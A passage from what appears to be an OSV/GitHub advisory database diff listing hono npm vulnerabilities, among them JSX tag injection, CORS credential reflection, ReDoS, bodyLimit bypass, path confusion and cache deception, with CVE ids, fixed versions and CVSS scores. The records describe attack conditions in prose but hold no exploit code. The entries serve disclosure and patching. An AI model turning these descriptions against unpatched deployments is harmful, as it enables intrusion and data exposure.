+    "details": "## Summary\n\nImproper handling of JSX element tag names in hono/jsx allowed unvalidated tag names to be directly inserted into the generated HTML output.\n\nWhen untrusted input is used as a tag name via the programmatic `jsx()` or `createElement()` APIs during server-side rendering, specially crafted values may break out of the intended element context and inject unintended HTML.\n\n## Details\n\nWhen rendering JSX elements to HTML strings, attribute values are escaped and attribute names are validated. However, element tag names were previously inserted into the output without validation.\n\nIf a tag name contains characters such as `<`, `>`, quotes, or whitespace, it may alter the structure of the generated HTML.\n\nFor example, malformed tag names can:\n\n* Break out of the intended element and introduce unintended HTML elements\n* Inject attributes or event handlers into the rendered output\n\nThis issue arises when untrusted input (such as query parameters or database content) is used as JSX tag names via `jsx()` or `createElement()` during server-side rendering.\n\n## Impact\n\nAn attacker who can control tag names used in JSX rendering may inject unintended HTML into the generated output.\n\nThis may lead to:\n\n* Injection of unexpected HTML elements or attributes\n* Corruption of the HTML structure\n* Cross-site scripting (XSS) when combined with unsafe usage patterns\n\nThis issue only affects applications that construct JSX tag names from untrusted input. Applications using static or allowlisted tag names are not affected.",
+    "aliases": [
+     "CVE-2026-44455"
+    ],
+    "modified": "2026-09-10T03:50:45.797738339Z",
+    "published": "2026-05-06T23:49:43Z",
+    "database_specific": {
+     "severity": "MODERATE",
+     "github_reviewed": true,
+     "github_reviewed_at": "2026-05-06T23:49:43Z",
+     "nvd_published_at": "2026-05-13T16:16:57Z",
+     "cwe_ids": [
+      "CWE-74"
+     ]
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-69xw-7hcm-h432"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-44455"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         },
+         {
+          "fixed": "4.12.16"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-69xw-7hcm-h432/GHSA-69xw-7hcm-h432.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-6wqw-2p9w-4vw4",
+    "summary": "Hono cache middleware ignores \"Cache-Control: private\" leading to Web Cache Deception",
+    "details": "## Summary\n\nCache Middleware contains an information disclosure vulnerability caused by improper handling of HTTP cache control directives. The middleware does not respect standard cache control headers such as `Cache-Control: private` or `Cache-Control: no-store`, which may result in private or authenticated responses being cached and subsequently exposed to unauthorized users.\n\n## Details\n\nThe vulnerability exists in the cache decision logic of Cache Middleware. When determining whether a response should be cached, the middleware does not take HTTP cache control semantics into account and may cache responses that are explicitly marked as private by the application. While some runtimes, such as Cloudflare Workers, enforce cache control restrictions at the platform level, other runtimes including Deno, Bun, and Node.js rely on the middleware\u2019s behavior. As a result, applications running on these runtimes may unintentionally cache sensitive responses.\n\n## Impact\n\nThis issue can lead to Web Cache Deception and information disclosure. If an authenticated user accesses an endpoint that returns user-specific or sensitive data and the response is cached despite being marked as private, subsequent unauthenticated requests may receive the cached response. This may result in the exposure of personally identifiable information or session-related data. The impact is limited to applications that use the hono/cache middleware and rely on it to correctly honor HTTP cache control directives.\n\n## Affected Components\n\n* Cache Middleware",
+    "aliases": [
+     "CVE-2026-24472"
+    ],
+    "modified": "2026-09-10T03:50:32.740573819Z",
+    "published": "2026-01-27T19:04:17Z",
+    "database_specific": {
+     "severity": "MODERATE",
+     "github_reviewed": true,
+     "github_reviewed_at": "2026-01-27T19:04:17Z",
+     "nvd_published_at": "2026-01-27T20:16:22Z",
+     "cwe_ids": [
+      "CWE-524",
+      "CWE-613"
+     ]
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-6wqw-2p9w-4vw4"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-24472"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/commit/12c511745b3f1e7a3f863a23ce5f921c7fa805d1"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/releases/tag/v4.11.7"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         },
+         {
+          "fixed": "4.11.7"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-6wqw-2p9w-4vw4/GHSA-6wqw-2p9w-4vw4.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-79qm-7rj5-m7r9",
+    "summary": "Hono: Proxy Helper does not remove response headers listed in the `Connection` header",
+    "details": "### Summary\n\nThe Proxy Helper (`hono/proxy`) does not remove response headers named by the origin's `Connection` header. Headers that the origin marked as connection-scoped are therefore forwarded to clients.\n\n### Details\n\nPer RFC 9110 Section 7.6.1, an intermediary must remove the header fields listed in a message's `Connection` header field before forwarding the message, in addition to the well-known hop-by-hop headers. The `proxy()` function removed the well-known hop-by-hop headers (including `Connection` itself) from origin responses, but did not remove the headers that the response's `Connection` header field designated as connection-scoped.\n\nThis issue arises when an application proxies responses from an origin that declares additional, non-standard headers as hop-by-hop via the `Connection` response header.\n\n### Impact\n\nA client may receive response headers that the origin intended only for its immediate peer. This may lead to:\n\n- Disclosure of connection-scoped or internal metadata contained in such headers\n\nThis issue affects applications that use the Proxy Helper (`hono/proxy`) to forward responses from origins that list custom header names in their `Connection` response header. Applications whose origins only use the standard hop-by-hop headers are not affected.",
+    "aliases": [
+     "CVE-2026-71849"
+    ],
+    "modified": "2026-09-10T03:51:13.317395159Z",
+    "published": "2026-08-07T18:38:48Z",
+    "database_specific": {
+     "cwe_ids": [
+      "CWE-200"
+     ],
+     "severity": "LOW",
+     "github_reviewed": true,
+     "github_reviewed_at": "2026-08-07T18:38:48Z",
+     "nvd_published_at": null
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-79qm-7rj5-m7r9"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/commit/720b566290793d4358bf39843adcb7cf4da4548f"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/releases/tag/v4.12.34"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "4.7.0"
+         },
+         {
+          "fixed": "4.12.34"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-79qm-7rj5-m7r9/GHSA-79qm-7rj5-m7r9.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-88fw-hqm2-52qc",
+    "summary": "hono: CORS Middleware reflects any Origin with credentials when `origin` defaults to the wildcard",
+    "details": "### Summary\n\nWith `credentials: true` and no explicit `origin` (the default wildcard), the CORS Middleware reflects the request's `Origin` and sends `Access-Control-Allow-Credentials: true`. Any site can then make credentialed cross-origin requests and read the responses, exposing cookie-authenticated endpoints to arbitrary origins.\n\n### Details\n\nThe spec forbids `Access-Control-Allow-Origin: *` with credentials and browsers reject it, so this configuration used to fail closed. In affected versions the middleware reflects the request `Origin` instead, so it now succeeds for every origin, including `null`. The preflight also echoes the requested headers back, approving non-simple credentialed requests too.\n\nThis issue arises when an application enables `credentials: true` and leaves `origin` unset or set to the wildcard.\n\n### Impact\n\nAny third-party page a logged-in user visits can read the application's cookie-authenticated endpoints and perform credentialed state-changing requests. This affects applications that enable credentialed CORS without restricting `origin`.",
+    "aliases": [
+     "CVE-2026-54290"
+    ],
+    "modified": "2026-09-10T03:50:48.939674527Z",
+    "published": "2026-06-16T14:15:39Z",
+    "database_specific": {
+     "cwe_ids": [
+      "CWE-942"
+     ],
+     "severity": "HIGH",
+     "github_reviewed": true,
+     "github_reviewed_at": "2026-06-16T14:15:39Z",
+     "nvd_published_at": "2026-06-22T18:16:47Z"
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-88fw-hqm2-52qc"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-54290"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         },
+         {
+          "fixed": "4.12.25"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-88fw-hqm2-52qc/GHSA-88fw-hqm2-52qc.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-8j4g-w8fx-2239",
+    "summary": "Hono: ReDoS in CORS middleware via Access-Control-Request-Headers",
+    "details": "### Summary\n\nThe built-in CORS middleware (`hono/cors`) parses the attacker-controlled `Access-Control-Request-Headers` request header during a preflight (`OPTIONS`) request using a regular expression whose running time is quadratic in the input length. A single request carrying a long run of whitespace can consume seconds of CPU, and repeated requests can render the service unresponsive. This parsing runs under the default configuration.\n\n### Details\n\nOn a CORS preflight, when `allowHeaders` is not configured - the default - the middleware reflects and parses the `Access-Control-Request-Headers` value. The parser used a whitespace-tolerant regular expression whose backtracking makes the work grow quadratically (O(n\u00b2)) with the length of the value when it contains a long whitespace sequence without a delimiter.\n\nBecause the header value is bounded only by the deployment's maximum HTTP header size, a single preflight can block request processing for a noticeable amount of time; on runtimes that share one execution thread across requests, this stalls concurrent requests as well. No authentication, special origin, or user interaction is required.\n\nThis issue arises for any application using `cors()` with the default (or an empty) `allowHeaders`. Applications that set a non-empty `allowHeaders` do not reach the affected path.\n\n### Impact\n\nAn unauthenticated attacker can send preflight requests that each consume disproportionate CPU relative to their size, degrading or denying service. This is a denial-of-service issue only; it does not expose or modify data.",
+    "aliases": [
+     "CVE-2026-69207"
+    ],
+    "modified": "2026-09-10T03:51:13.583285977Z",
+    "published": "2026-08-03T20:23:30Z",
+    "database_specific": {
+     "cwe_ids": [
+      "CWE-1333"
+     ],
+     "severity": "MODERATE",
+     "github_reviewed": true,
+     "github_reviewed_at": "2026-08-03T20:23:30Z",
+     "nvd_published_at": null
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-8j4g-w8fx-2239"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/commit/93fc250d8b4df58ea542cb945171de8013d5e6d5"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/releases/tag/v4.12.34"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         },
+         {
+          "fixed": "4.12.34"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-8j4g-w8fx-2239/GHSA-8j4g-w8fx-2239.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-92vj-g62v-jqhh",
+    "summary": "Hono has Body Limit Middleware Bypass",
+    "details": "### Summary\nA flaw in the `bodyLimit` middleware could allow bypassing the configured request body size limit when conflicting HTTP headers were present.\n\n### Details\nThe middleware previously prioritized the `Content-Length` header even when a `Transfer-Encoding: chunked` header was also included. According to the HTTP specification, `Content-Length` must be ignored in such cases. This discrepancy could allow oversized request bodies to bypass the configured limit.\n\nMost standards-compliant runtimes and reverse proxies may reject such malformed requests with `400 Bad Request`, so the practical impact depends on the runtime and deployment environment.\n\n### Impact\nIf body size limits are used as a safeguard against large or malicious requests, this flaw could allow attackers to send oversized request bodies. The primary risk is denial of service (DoS) due to excessive memory or CPU consumption when handling very large requests.\n\n### Resolution\nThe implementation has been updated to align with the HTTP specification, ensuring that `Transfer-Encoding` takes precedence over `Content-Length`. The issue is fixed in Hono v4.9.7, and all users should upgrade immediately.",
+    "aliases": [
+     "CVE-2025-59139"
+    ],
+    "modified": "2026-09-10T03:50:28.122949815Z",
+    "published": "2025-09-12T21:12:20Z",
+    "database_specific": {
+     "severity": "MODERATE",
+     "github_reviewed": true,
+     "github_reviewed_at": "2025-09-12T21:12:20Z",
+     "nvd_published_at": "2025-09-12T14:15:41Z",
+     "cwe_ids": [
+      "CWE-400",
+      "CWE-770"
+     ]
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-92vj-g62v-jqhh"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-59139"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/commit/605c70560b52f13af10379f79b76717042fafe8d"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         },
+         {
+          "fixed": "4.9.7"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/09/GHSA-92vj-g62v-jqhh/GHSA-92vj-g62v-jqhh.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-9hp6-4448-45g2",
+    "summary": "Hono's flaw in URL path parsing could cause path confusion",
+    "details": "### Summary\n\nA flaw in the `getPath` utility function could allow path confusion and potential bypass of proxy-level ACLs (e.g. Nginx location blocks).\n\n### Details\n\nThe original implementation relied on fixed character offsets when parsing request URLs. Under certain malformed absolute-form Request-URIs, this could lead to incorrect path extraction.\n\nMost standards-compliant runtimes and reverse proxies reject such malformed requests with a 400 Bad Request, so the impact depends on the application and environment.\n\n### Impact\n\nIf proxy ACLs are used to protect sensitive endpoints such as `/admin`, this flaw could have allowed unauthorized access. The confidentiality impact depends on what data is exposed: if sensitive administrative data is exposed, the impact may be High (CVSS 7.5); otherwise it may be Medium (CVSS 5.3).\n\n### Resolution\n\nThe implementation has been updated to correctly locate the first slash after \"://\", preventing such path confusion.",
+    "aliases": [
+     "CVE-2025-58362"
+    ],
+    "modified": "2025-09-05T16:11:28Z",
+    "published": "2025-09-03T21:30:13Z",
+    "database_specific": {
+     "nvd_published_at": "2025-09-05T00:15:32Z",
+     "cwe_ids": [
+      "CWE-706"
+     ],
+     "severity": "HIGH",
+     "github_reviewed": true,
+     "github_reviewed_at": "2025-09-03T21:30:13Z"
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-9hp6-4448-45g2"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-58362"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/commit/1d79aedc3f82d8c9969b115fe61bc4bd705ec8de"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/releases/tag/v4.9.6"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "4.8.0"
+         },
+         {
+          "fixed": "4.9.6"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/09/GHSA-9hp6-4448-45g2/GHSA-9hp6-4448-45g2.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-9r54-q6cx-xmh5",
+    "summary": "Hono vulnerable to XSS through ErrorBoundary component ",
+    "details": "## Summary\n\nA Cross-Site Scripting (XSS) vulnerability exists in the `ErrorBoundary` component of the hono/jsx library. Under certain usage patterns, untrusted user-controlled strings may be rendered as raw HTML, allowing arbitrary script execution in the victim's browser.\n\n## Details\n\nThe issue is in the `ErrorBoundary` component (`src/jsx/components.ts`). `ErrorBoundary` previously forced certain rendered output paths to be treated as raw HTML, bypassing the library's default escaping behavior. This could result in unescaped rendering when developers pass user-controlled strings directly as children, or when fallbackRender returns user-controlled strings (for example, reflecting error messages that contain attacker input).\n\nThis vulnerability is only exploitable when an application renders untrusted user input within `ErrorBoundary` without appropriate escaping or sanitization.\n\n## Impact\n\nSuccessful exploitation may allow attackers to execute arbitrary JavaScript in the victim\u2019s browser (reflected XSS). Depending on the application context, this can lead to actions such as session compromise, data exfiltration, or performing unauthorized actions as the victim.\n\n## Affected Components\n\n* hono/jsx: `ErrorBoundary` component",
+    "aliases": [
+     "CVE-2026-24771"
+    ],
+    "modified": "2026-09-10T03:50:32.846997493Z",
+    "published": "2026-01-28T16:10:22Z",
+    "database_specific": {
+     "github_reviewed_at": "2026-01-28T16:10:22Z",
+     "nvd_published_at": "2026-01-27T20:16:24Z",
+     "cwe_ids": [
+      "CWE-79"
+     ],
+     "severity": "MODERATE",
+     "github_reviewed": true
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-9r54-q6cx-xmh5"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-24771"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/commit/2cf60046d730df9fd0aba85178f3ecfe8212d990"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         },
+         {
+          "fixed": "4.11.7"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-9r54-q6cx-xmh5/GHSA-9r54-q6cx-xmh5.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-9vqf-7f2p-gf9v",
+    "summary": "Hono: bodyLimit() can be bypassed for chunked / unknown-length requests",
+    "details": "## Summary\n\n`bodyLimit()` does not reliably enforce `maxSize` for requests without a usable `Content-Length` (e.g. `Transfer-Encoding: chunked`). Oversized requests can reach handlers and return `200` instead of `413`.\n\n## Details\n\nFor chunked / unknown-length requests, `bodyLimit()` wraps the body in a stream that counts bytes asynchronously, then runs the handler before the size decision is final. The `413` is only applied afterwards by checking `c.error`.\n\nThis lets the limit be bypassed when:\n\n- the handler does not read the body,\n- the handler reads only the first chunk(s) and returns, or\n- the handler reads the body but swallows the read error in `try/catch`.\n\nIn all three cases the handler returns `200` before the limit check completes (or its result is observed).\n\nThe fix is to enforce the size decision before `next()` runs, instead of retrofitting the response via `c.error` afterwards.\n\n## Impact\n\nApplications relying on `bodyLimit()` as a hard boundary can be bypassed: oversized chunked requests can reach handler logic and return successful responses. Per-request data exposure is bounded by `maxSize`, but the documented guarantee \u2014 \"oversized requests are rejected before business logic runs\" \u2014 does not hold.\n\n## Credits\n\n- @lalalala5678 (slow chunked / early return variants)\n- @Jvr2022 (error handling bypass)",
+    "aliases": [
+     "CVE-2026-44456"
+    ],
+    "modified": "2026-09-10T03:50:46.398393701Z",
+    "published": "2026-05-06T23:50:10Z",
+    "database_specific": {
+     "cwe_ids": [
+      "CWE-400"
+     ],
+     "severity": "MODERATE",
+     "github_reviewed": true,
+     "github_reviewed_at": "2026-05-06T23:50:10Z",
+     "nvd_published_at": "2026-05-13T16:16:57Z"
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-9vqf-7f2p-gf9v"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-44456"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         },
+         {
+          "fixed": "4.12.16"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-9vqf-7f2p-gf9v/GHSA-9vqf-7f2p-gf9v.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-crvj-82cr-hjcx",
+    "summary": "Hono: Query parser reads parameters after the URL fragment, causing cache-key and proxy interpretation differentials",
+    "details": "### Summary\n\nHono's query parsing does not stop at the URL fragment: a `?` appearing after a `#` is treated as the start of a query string. As a result, the application can read request parameters that no other component involved in handling the request can see.\n\n### Details\n\nA fragment is never part of the query, and every standard URL consumer \u2014 browsers, `new URL()`, reverse proxies \u2014 ignores everything from the first `#` onward. Hono's routing followed that rule; its query helpers did not.\n\nFor one and the same request, this produces an interpretation differential:\n\n- A component in front of the application that inspects the query string \u2014 filtering rules, parameter allow/deny lists, access logging \u2014 observes no parameters, while the application reads and acts on them.\n- The cache middleware removed the fragment when building its cache key, so a response influenced by parameters carried inside the fragment could be stored under a key that did not reflect them and later returned to other users.\n\nThe same divergence reaches request validation and any middleware that reads query parameters.\n\nThis requires a request target containing a literal `#` to reach the application. Deployments on runtimes that normalise such a target \u2014 including Cloudflare Workers \u2014 are not affected, and neither are those behind an intermediary that strips the fragment.\n\n### Impact\n\nAn attacker can cause the application to act on parameters that components in front of it never observe.\n\nThis may lead to:\n\n- filtering rules, allow/deny lists, and audit logging being blind to parameters the application still processes\n- a cached response being stored under a key that does not reflect the parameters used to produce it, and served to other users\n- stored cross-site scripting, where such a parameter is reflected into a cached HTML response without escaping\n\nThis issue affects applications that read query parameters and run on a runtime that passes a literal `#` through to the request URL.",
+    "aliases": [
+     "CVE-2026-84363"
+    ],
+    "modified": "2026-09-08T21:30:04.756349206Z",
+    "published": "2026-09-08T21:22:50Z",
+    "database_specific": {
+     "github_reviewed": true,
+     "github_reviewed_at": "2026-09-08T21:22:50Z",
+     "nvd_published_at": "2026-09-01T21:18:47Z",
+     "cwe_ids": [
+      "CWE-444"
+     ],
+     "severity": "MODERATE"
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-crvj-82cr-hjcx"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-84363"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/commit/9c28d724c5a7fb086ebaa812fdc1ad6e957c63bc"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/releases/tag/v4.13.5"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         },
+         {
+          "fixed": "4.13.5"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-crvj-82cr-hjcx/GHSA-crvj-82cr-hjcx.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-f23p-vx2j-j53r",
+    "summary": "Hono: `memo()` retains SSR output across requests, leading to cross-user data disclosure",
+    "details": "### Summary\n\n`memo()` from `hono/jsx` retains the result of a server-side render and reuses it for later renders with comparator-equal props. Request-scoped values read inside the component take no part in that comparison, so a response can contain HTML rendered for another user's request.\n\n### Details\n\nComponents wrapped with `memo()` are compared by props alone. Values read implicitly during rendering do not participate: JSX Context through `createContext()` and `useContext()`, `useRequestContext()` from `hono/jsx-renderer`, and `getContext()` from `hono/context-storage`. The retained result lives as long as the wrapped component, so it outlives the request that produced it.\n\nPer-request context isolation is not what fails: the current request's values are established correctly, but the memoized component is skipped before anything reads them.\n\nThis issue arises when a component wrapped in `memo()` obtains user- or request-specific data from an ambient context instead of through props.\n\n### Impact\n\nA user may receive a response containing HTML rendered for another user, when both render the same memoized component with comparator-equal props on the same warm instance.\n\nThis may lead to:\n\n- Disclosure of another user's account or profile data\n- Disclosure of request-scoped secrets embedded in HTML, such as CSRF tokens\n- Exposure of role-specific content to users who should not receive it\n\nExploitation depends on the order in which renders populate the retained value and on both requests reaching the same warm instance.\n\nThis issue affects applications that render with `hono/jsx` on the server and wrap a component reading ambient request state in `memo()`. Applications that pass all request-specific values through props, or that do not use `memo()`, are unaffected. Client-side rendering is unaffected.",
+    "aliases": [
+     "CVE-2026-71850"
+    ],
+    "modified": "2026-09-10T03:51:13.947851047Z",
+    "published": "2026-08-07T18:42:01Z",
+    "database_specific": {
+     "cwe_ids": [
+      "CWE-488"
+     ],
+     "severity": "MODERATE",
+     "github_reviewed": true,
+     "github_reviewed_at": "2026-08-07T18:42:01Z",
+     "nvd_published_at": null
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-f23p-vx2j-j53r"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/commit/0c45036d6b0ddf42ab2fa44639dc8710825d5c0f"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/releases/tag/v4.12.34"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "3.8.0"
+         },
+         {
+          "fixed": "4.12.34"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-f23p-vx2j-j53r/GHSA-f23p-vx2j-j53r.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:N/A:N"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-f577-qrjj-4474",
+    "summary": "Hono: JWT middleware accepts any Authorization scheme, not only Bearer",
